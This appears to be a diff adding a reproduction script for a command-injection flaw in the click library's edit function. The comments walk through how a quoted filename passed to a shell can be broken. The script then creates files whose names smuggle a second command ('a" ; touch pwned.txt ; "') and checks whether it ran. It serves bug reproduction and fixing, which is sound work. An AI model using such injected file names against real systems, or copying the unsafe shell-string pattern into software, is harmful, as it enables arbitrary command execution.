+++ b/reproduce_issue.py
@@ -0,0 +1,86 @@
+import os
+import subprocess
+import click
+from click._termui_impl import Editor
+
+# Create a file with a tricky name
+tricky_filename = 'file with spaces; touch pwned.txt'
+with open(tricky_filename, 'w') as f:
+    f.write('hello')
+
+# Try to edit it using click.edit
+try:
+    # We need to mock the editor to something that doesn't actually open an editor
+    # but just echoes the command, or just use a simple command.
+    # Actually, the current implementation uses subprocess.Popen(f'{editor} "{filename}"', shell=True)
+    # If we set editor to 'echo', it will run 'echo "file with spaces; touch pwned.txt"'
+    # which will print the filename.
+    # If we set editor to 'sh -c', it might be more interesting.
+    
+    # Let's try to see if we can trigger the command injection.
+    # If we set editor to 'echo', the command will be:
+    # echo "file with spaces; touch pwned.txt"
+    # This will just print the filename.
+    
+    # What if we set editor to 'cat'?
+    # cat "file with spaces; touch pwned.txt"
+    # This will fail because the file doesn't exist (it's named 'file with spaces; touch pwned.txt')
+    
+    # Wait, the current implementation is:
+    # subprocess.Popen(f'{editor} "{filename}"', env=environ, shell=True)
+    # If filename is 'file with spaces; touch pwned.txt'
+    # The command is: editor "file with spaces; touch pwned.txt"
+    # If editor is 'cat', it runs: cat "file with spaces; touch pwned.txt"
+    # This is actually safe because of the quotes!
+    
+    # Wait, what if the filename contains a double quote?
+    # filename = 'file"with"quotes'
+    # command = 'cat "file"with"quotes"'
+    # This would be: cat "file" with "quotes"
+    # This is definitely a problem!
+    
+    tricky_filename_quotes = 'file"with"quotes.txt'
+    with open(tricky_filename_quotes, 'w') as f:
+        f.write('hello')
+        
+    print(f"Attempting to edit: {tricky_filename_quotes}")
+    # We use 'cat' as the editor to see what command is executed
+    # Actually, we can't easily see the command executed, but we can see if it fails.
+    
+    # Let's try to use a filename that breaks the quoting.
+    # If filename is 'a" ; touch pwned ; "'
+    # The command is: cat "a" ; touch pwned ; "" "
+    # This will run:
+    # 1. cat "a"
+    # 2. touch pwned
+    # 3. ""
+    
+    pwn_filename = 'a" ; touch pwned.txt ; "'
+    with open(pwn_filename, 'w') as f:
+        f.write('hello')
+        
+    print(f"Attempting to edit: {pwn_filename}")
+    
+    # We need to make sure the file exists.
+    # The file is created.
+    
+    # Now call click.edit
+    # We need to set the editor to something that doesn't block.
+    # 'cat' is fine.
+    
+    click.edit(filename=pwn_filename, editor='cat')
+    
+    if os.path.exists('pwned.txt'):
+        print("Successfully pwned!")
+    else:
+        print("Not pwned.")
+        
+finally:
+    if os.path.exists('pwned.txt'):
+        os.remove('pwned.txt')
+    if os.path.exists('file with spaces; touch pwned.txt'):
+        os.remove('file with spaces; touch pwned.txt')
+    if os.path.exists('file"with"quotes.txt'):
+        os.remove('file"with"quotes.txt')
+    if os.path.exists('a" ; touch pwned.txt ; "'):
+        os.remove('a" ; touch pwned.txt ; "')
